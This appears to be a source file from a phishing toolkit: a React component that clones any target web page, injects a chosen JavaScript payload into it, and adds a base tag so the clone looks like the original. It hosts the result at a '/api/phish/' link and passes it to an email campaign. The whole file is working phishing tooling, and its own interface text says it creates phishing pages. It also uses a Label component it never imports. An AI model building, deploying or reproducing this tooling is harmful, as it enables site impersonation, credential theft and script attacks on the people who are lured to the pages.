
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Wand, Share2, Clipboard, Globe } from 'lucide-react';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { QrCodeGenerator } from './qr-code-generator';
import type { JsPayload } from '@/types';
import { hostPageOnServer } from '@/actions/host-page-action';

const formSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
});

type AdvancedPageClonerProps = {
  selectedPayload: JsPayload | null;
  onSelectPayload: (payload: JsPayload) => void;
  onLinkGenerated: (url: string) => void;
}

export function AdvancedPageCloner({ selectedPayload, onLinkGenerated }: AdvancedPageClonerProps) {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isHosting, setIsHosting] = useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: 'https://google.com',
    },
  });

  const processAndInject = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      toast({ title: 'Cloning Page...', description: 'Fetching DOM from the target URL.' });
      const response = await clonePageFromUrl({ url: values.targetUrl });
      let html = response.htmlContent;
      
      const payloadToInject = selectedPayload?.code;
      if (!payloadToInject) {
          throw new Error("No JavaScript payload selected.");
      }
      
      const scriptToInject = `<script>${payloadToInject}</script>`;
      
      if (html.includes('</body>')) {
          html = html.replace(/<\/body>/i, `${scriptToInject}</body>`);
      } else {
          html += scriptToInject;
      }
      
      // Inject <base> tag to fix relative links
      if (html.includes('<head>')) {
        html = html.replace(/<head>/i, `<head>\\n<base href="${values.targetUrl}">`);
      } else {
        html = `<head><base href="${values.targetUrl}"></head>${html}`;
      }
      
      setModifiedHtml(html);
      toast({ title: 'Injection Complete', description: 'HTML is ready for hosting.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Cloning Failed', description: error });
    } finally {
      setIsLoading(false);
    }
  };

  const handleGenerateLink = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    setHostedUrl(null);
    try {
        const pageId = await hostPageOnServer(modifiedHtml);
        const finalUrl = `${window.location.origin}/api/phish/${pageId}`;
        setHostedUrl(finalUrl);
        toast({ title: "Public Link Generated!", description: "Your phishing page is now live." });
        
        logActivity({
            user: user?.displayName || 'Operator',
            action: 'Generated Phishing Link',
            details: `Source: ${form.getValues('targetUrl')}`,
        });

    } catch(err) {
        const error = err instanceof Error ? err.message : "An unknown error occurred";
        toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
    } finally {
        setIsHosting(false);
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>Page Cloner</CardTitle>
        <CardDescription>Clone a site and inject a JS payload to create a phishing page.</CardDescription>
      </CardHeader>
      <Form {...form}>
      <form onSubmit={form.handleSubmit(processAndInject)}>
        <CardContent className="space-y-4">
            <FormField
            control={form.control}
            name="targetUrl"
            render={({ field }) => (
                <FormItem>
                <FormLabel>Target Page URL</FormLabel>
                <FormControl>
                    <Input placeholder="https://example.com/login" {...field} />
                </FormControl>
                <FormMessage />
                </FormItem>
            )}
            />
            <div className="flex flex-col sm:flex-row gap-2">
              <Button type="submit" disabled={isLoading} className="w-full">
                  {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
                  Clone & Inject
              </Button>
              <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full">
                  {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
                  Generate Link
              </Button>
            </div>
        </CardContent>
      </form>
      </Form>
      {hostedUrl && (
        <CardFooter className="flex-col items-start gap-4">
            <div className="w-full space-y-2">
                <Label>Generated Phishing Link</Label>
                <div className="w-full flex items-center gap-2">
                    <Input readOnly value={hostedUrl} className="font-mono" />
                    <Button type="button" size="icon" variant="outline" onClick={() => {
                        navigator.clipboard.writeText(hostedUrl);
                        toast({ title: 'Copied!'});
                    }}>
                        <Clipboard className="h-4 w-4" />
                    </Button>
                    <Button type="button" size="icon" variant="outline" asChild>
                        <a href={hostedUrl} target="_blank" rel="noopener noreferrer"><Globe className="h-4 w-4" /></a>
                    </Button>
                </div>
            </div>
            <div className="w-full">
                <Button className="w-full" onClick={() => onLinkGenerated(hostedUrl)}>
                     Send via Email Campaign
                </Button>
            </div>
        </CardFooter>
      )}
    </Card>
  );
}
